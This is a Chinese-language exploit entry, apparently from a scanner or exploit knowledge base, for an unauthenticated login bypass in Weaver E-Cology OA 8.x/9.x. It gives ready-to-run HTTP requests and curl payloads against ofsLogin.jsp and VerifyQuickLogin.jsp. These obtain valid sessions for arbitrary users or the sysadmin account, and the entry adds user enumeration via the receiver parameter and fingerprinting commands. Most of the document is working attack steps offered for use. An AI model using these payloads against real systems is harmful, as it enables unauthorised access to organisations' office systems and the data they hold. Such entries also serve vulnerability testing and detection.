---
id: WEAVER-OA-AUTH-BYPASS
title: 泛微OA ofsLogin/VerifyQuickLogin 任意用户登录
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology 9.x, 8.x"
severity: CRITICAL
tags: [auth_bypass, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "ecology", "ofsLogin", "VerifyQuickLogin"]
---

## 漏洞描述

泛微OA ofsLogin.jsp 和 VerifyQuickLogin.jsp 接口存在认证绕过漏洞，攻击者无需认证即可获取任意用户或管理员的有效 Session。

## 影响版本

- E-Cology 9.x
- E-Cology 8.x

## 前置条件

- 无需认证
- 目标为泛微OA E-Cology 8.x/9.x，ofsLogin.jsp 或 VerifyQuickLogin.jsp 接口可访问

## 利用步骤

### 方式一：ofsLogin.jsp 前台任意用户登录

```http
GET /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird= HTTP/1.1
Host: target
```

返回有效 Session 即登录成功，可遍历 receiver 参数枚举用户。

### 方式二：VerifyQuickLogin.jsp 管理员登录

```http
POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

identifier=1&language=1&ipaddress=x.x.x.x
```

identifier=1 通常为 sysadmin，返回 Set-Cookie 中的 session 即为管理员会话。

## Payload

```bash
# 方式一：ofsLogin.jsp 任意用户登录
curl -v "http://target/mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird="

# 方式二：VerifyQuickLogin.jsp 管理员登录
curl -v -X POST "http://target/mobile/plugin/VerifyQuickLogin.jsp" \
  -d "identifier=1&language=1&ipaddress=127.0.0.1"
```

## 验证方法

ofsLogin 返回有效 session cookie；VerifyQuickLogin 响应 Set-Cookie 包含 JSESSIONID。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/mobile/plugin/1/ofsLogin.jsp
curl -s -o /dev/null -w "%{http_code}" http://target/mobile/plugin/VerifyQuickLogin.jsp
```
